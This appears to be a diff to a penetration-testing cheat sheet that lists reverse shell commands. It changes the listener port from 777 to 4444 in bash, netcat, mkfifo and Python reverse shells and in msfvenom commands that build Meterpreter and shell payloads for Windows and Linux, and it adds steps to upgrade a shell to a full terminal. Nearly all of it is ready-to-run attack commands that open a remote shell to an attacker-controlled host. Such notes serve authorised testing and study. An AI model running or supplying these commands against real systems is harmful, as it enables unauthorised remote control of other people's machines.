@@ -4,15 +4,15 @@ sudo python3 -m http.server 80
 <a href="https://weibell.github.io/reverse-shell-generator/">Reverse Shell Generator</a><br>
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Cheatsheet <3</a>
 ```bash
-bash -i >& /dev/tcp/10.10.0.1/777 0>&1
-nc -e /bin/bash 10.10.0.1 777
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 >/tmp/f
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/10.10.0.1/4444 0>&1
+nc -e /bin/bash 10.10.0.1 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 4444 >/tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f exe > reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f exe > reverse.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
 -e x86/shikata_ga_nai -i 25
 
 Linux x86 /bin/sh execve
@@ -36,8 +36,14 @@ lua: os.execute('/bin/bash')
 CTRL-Z
 stty raw -echo
 fg
-
 export TERM=xterm
+
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
 
 rlwrap nc -vlnp 1234
 ```
